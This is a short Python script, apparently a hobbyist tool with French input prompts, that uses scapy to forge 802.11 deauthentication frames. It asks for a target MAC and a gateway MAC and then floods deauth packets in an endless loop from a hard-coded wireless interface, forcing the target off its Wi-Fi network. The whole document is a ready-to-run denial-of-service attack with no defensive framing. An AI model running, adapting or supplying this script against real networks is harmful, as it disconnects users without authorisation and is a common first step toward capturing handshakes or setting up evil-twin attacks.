from scapy.all import *
from threading import Thread
from termcolor import colored
import time


def has_root():
    return os.geteuid() == 0

#Deauth packet for accespoint
def deauth_ap(target_mac, gateway_mac):
     frame_ap = RadioTap()/Dot11(type=8, subtype=12, addr1 = gateway_mac, addr2 =target_mac, addr3 = gateway_mac)/Dot11Deauth(reason=7)
     sendp(frame_ap, iface = 'wlp2s0', count = 100, inter = .001)

#Deauth packet for client
def deauth_cli(target_mac, gateway_mac):
     frame_cli = RadioTap()/Dot11(type=8, subtype=12, addr1 = target_mac, addr2 = gateway_mac, addr3 = gateway_mac)/Dot11Deauth(reason=7)
     sendp(frame_cli, iface = 'wlp2s0', count = 100, inter = .001)


if __name__ == "__main__":
     if has_root():
          target_mac = str(input(colored("Entrer l'adresse mac de la cible >>> ", "blue")))
          gateway_mac = str(input(colored("Entrer l'adresse mac du gateway >>> ", "blue")))
          while True:
               deauth_ap(target_mac, gateway_mac)
     else:
          print(colored("Run this script with root privileges", "red"))
